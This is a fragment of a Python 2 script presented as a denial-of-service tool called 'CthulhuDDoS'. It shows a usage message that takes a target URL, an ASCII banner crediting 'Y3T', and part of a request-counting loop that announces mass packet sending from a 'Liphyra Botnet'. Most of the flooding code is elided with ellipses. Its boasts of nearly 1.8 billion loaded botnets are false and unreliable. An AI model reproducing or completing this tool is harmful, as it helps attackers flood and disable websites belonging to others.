...
def usage():
	print 'CthulhuDDoS (Not THAT distributed but its great)'
	print 'New loaded Botnets: 1,798,445,657'
	print 'Usage: Cthulhu(url)'
	print 'Example: Cthulhu.py http://TheCall.com'
	print "\a"
print \
"""
  _______ __   __          __ __          ______   ______         _______ 
 |   _   |  |_|  |--.--.--|  |  |--.--.--|   _  \ |   _  \ .-----|   _   |
 |.  1___|   _|     |  |  |  |     |  |  |.  |   \|.  |   \|  _  |   1___|
 |.  |___|____|__|__|_____|__|__|__|_____|.  |    |.  |    |_____|____   |
 |:  1   |                               |:  1    |:  1    /     |:  1   |
 |::.. . |                               |::.. . /|::.. . /      |::.. . |
 `-------'                               `------' `------'       `-------'
				  ->Made by Y3T<-
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
		if flag==2:
			print "\n-- Sending mass amount of packets generated by the unstoppable Liphyra Botnet --"
